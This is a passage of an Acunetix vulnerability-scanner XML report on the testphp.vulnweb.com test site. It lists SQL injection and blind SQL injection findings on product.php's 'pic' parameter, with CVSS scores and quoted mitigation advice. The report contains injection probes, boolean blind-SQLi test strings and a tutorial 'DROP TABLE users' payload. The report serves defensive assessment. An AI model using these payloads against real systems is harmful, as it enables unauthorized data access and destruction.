Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:26 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4180
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="64" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">pic</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/product.php on line 70</font></pre>]]></Details>
       <Affects><![CDATA[/product.php]]></Affects>
       <Parameter><![CDATA[pic]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /product.php?pic=1'&quot; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:24 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4387
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="65" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">pic</font></b> was set to <b><font color="dark">4 AND 3*2*1=6 AND 908=908</font></b><br/><br/>Tests performed: <ul><li>1*1*1*4 =&gt; <b>TRUE</b></li><li>4*908*903*0 =&gt; <b>FALSE</b></li><li>14*5*2*999 =&gt; <b>FALSE</b></li><li>4*1*1 =&gt; <b>TRUE</b></li><li>1*1*1*1*1*4 =&gt; <b>TRUE</b></li><li>14*1*1*0*1*1*908 =&gt; <b>FALSE</b></li><li>4 AND 5*4=20 AND 908=908 =&gt; <b>TRUE</b></li><li>4 AND 5*4=21 AND 908=908 =&gt; <b>FALSE</b></li><li>4 AND 5*6&lt;26 AND 908=908 =&gt; <b>FALSE</b></li><li>4 AND 7*7&gt;48 AND 908=908 =&gt; <b>TRUE</b></li><li>4 AND 3*2*0=6 AND 908=908 =&gt; <b>FALSE</b></li><li>4 AND 3*2*1=6 AND 908=908 =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>4</b>]]></Details>
       <Affects><![CDATA[/product.php]]></Affects>
       <Parameter><![CDATA[pic]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /product.php?pic=4%20AND%203*2*1=6%20AND%20908=908 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:29 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5666
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
